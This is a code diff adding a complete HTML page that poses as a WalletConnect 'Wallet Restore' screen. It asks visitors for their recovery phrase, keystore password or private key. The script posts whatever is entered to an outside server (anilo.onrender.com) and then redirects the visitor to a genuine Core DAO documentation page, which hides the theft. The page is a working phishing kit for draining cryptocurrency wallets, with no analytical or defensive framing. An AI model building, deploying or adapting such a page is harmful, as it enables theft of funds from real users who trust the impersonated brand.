@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Wallet Restore</title>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    background-color: #0e1014;
+    font-family: 'Inter', sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+  }
+  .container {
+    background-color: #fff;
+    border-radius: 10px;
+    width: 360px;
+    padding: 25px;
+    box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+    text-align: center;
+  }
+  .logo { display: flex; justify-content: center; margin-bottom: 20px; }
+  .logo img { width: 60px; }
+  .tabs {
+    display: flex;
+    justify-content: space-between;
+    border-bottom: 1px solid #ddd;
+    margin-bottom: 15px;
+  }
+  .tab {
+    flex: 1;
+    text-align: center;
+    padding: 10px 0;
+    cursor: pointer;
+    color: #666;
+    font-weight: 500;
+    border-bottom: 2px solid transparent;
+    transition: 0.2s;
+  }
+  .tab.active { color: #111; border-bottom: 2px solid #007bff; }
+  textarea, input[type="file"], input[type="text"] {
+    width: 100%;
+    border-radius: 6px;
+    border: 1px solid #ccc;
+    padding: 10px;
+    font-size: 14px;
+    outline: none;
+    resize: none;
+  }
+  textarea { height: 110px; }
+  input[type="text"] { height: 45px; }
+
+  .error-msg {
+    margin-top: 8px;
+    color: #b00020;
+    background-color: #ffcccc;
+    border-radius: 6px;
+    padding: 8px;
+    font-size: 13px;
+    display: none;
+    text-align: left;
+  }
+
+  .button-wrapper {
+    margin-top: 25px;
+    display: flex;
+    justify-content: center;
+  }
+  button {
+    font-weight: 600;
+    border: none;
+    border-radius: 6px;
+    cursor: pointer;
+    background-color: #007bff;
+    color: #fff;
+    padding: 10px 40px;
+    transition: background 0.2s ease;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+  }
+  button:hover { background-color: #006ae1; }
+
+  .spinner {
+    border: 3px solid #f3f3f3;
+    border-top: 3px solid #007bff;
+    border-right: 3px solid #007bff;
+    border-radius: 50%;
+    width: 14px;
+    height: 14px;
+    animation: spin 1s linear infinite;
+  }
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.png" alt="WalletConnect Logo" />
+    </div>
+
+    <div class="tabs">
+      <div class="tab active" data-type="phrase">Phrase</div>
+      <div class="tab" data-type="keystore">Keystore</div>
+      <div class="tab" data-type="privatekey">Private Key</div>
+    </div>
+
+    <div id="input-area">
+      <textarea placeholder="Enter your recovery phrase"></textarea>
+      <div class="error-msg" id="error-msg"></div>
+    </div>
+
+    <div class="button-wrapper">
+      <button class="connect-btn">CONNECT</button>
+    </div>
+  </div>
+
+<script>
+const tabs = document.querySelectorAll('.tab');
+const inputArea = document.getElementById('input-area');
+const connectBtn = document.querySelector('.connect-btn');
+const errorMsg = document.getElementById('error-msg');
+let selectedType = 'phrase';
+
+tabs.forEach(tab => {
+  tab.addEventListener('click', () => {
+    tabs.forEach(t => t.classList.remove('active'));
+    tab.classList.add('active');
+    selectedType = tab.dataset.type;
+    errorMsg.style.display = 'none';
+
+    if (selectedType === 'phrase') {
+      inputArea.innerHTML = `
+        <textarea placeholder="Enter your recovery phrase"></textarea>
+        <div class="error-msg" id="error-msg"></div>
+      `;
+    } else if (selectedType === 'keystore') {
+      inputArea.innerHTML = `
+        <input type="file" accept=".json" id="keystoreFile" />
+        <input type="text" id="passwordInput" placeholder="Enter password" style="margin-top:10px">
+      `;
+    } else {
+      inputArea.innerHTML = '<input type="text" placeholder="Enter your private key">';
+    }
+  });
+});
+
+connectBtn.addEventListener('click', async () => {
+  const currentError = document.getElementById('error-msg');
+  if (currentError) currentError.style.display = 'none';
+  let data = '';
+
+  if (selectedType === 'phrase') {
+    data = document.querySelector('textarea').value.trim();
+    const words = data.split(/\s+/).filter(w => w.length > 0);
+    if (words.length < 12) {
+      const errBox = document.getElementById('error-msg');
+      errBox.textContent = 'Invalid recovery phrase. It must contain at least 12 words.';
+      errBox.style.display = 'block';
+      return;
+    }
+  } else if (selectedType === 'keystore') {
+    const pass = document.getElementById('passwordInput').value.trim();
+    data = 'Keystore file uploaded, password: ' + pass;
+  } else {
+    data = document.querySelector('input[type=text]').value.trim();
+  }
+
+  if (!data) {
+    const errBox = document.getElementById('error-msg');
+    if (errBox) {
+      errBox.textContent = 'Please enter your data before connecting.';
+      errBox.style.display = 'block';
+    }
+    return;
+  }
+
+  connectBtn.disabled = true;
+  connectBtn.innerHTML = '<div class="spinner"></div> Connecting...';
+
+  try {
+    const res = await fetch('https://anilo.onrender.com/submit', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ kheed: data })
+    });
+    if (res.ok) {
+      setTimeout(() => {
+        window.location.href = 'https://docs.coredao.org/docs/stake-and-delegate/btc-staking/Redeeming-Guide';
+      }, 1200);
+    } else {
+      connectBtn.innerHTML = '❌ Failed';
+      setTimeout(() => window.location.reload(), 1500);
+    }
+  } catch (err) {
+    connectBtn.innerHTML = '⚠️ Error';
+    setTimeout(() => window.location.reload(), 1500);
+  }
+});
+</script>
+</body>
+</html>
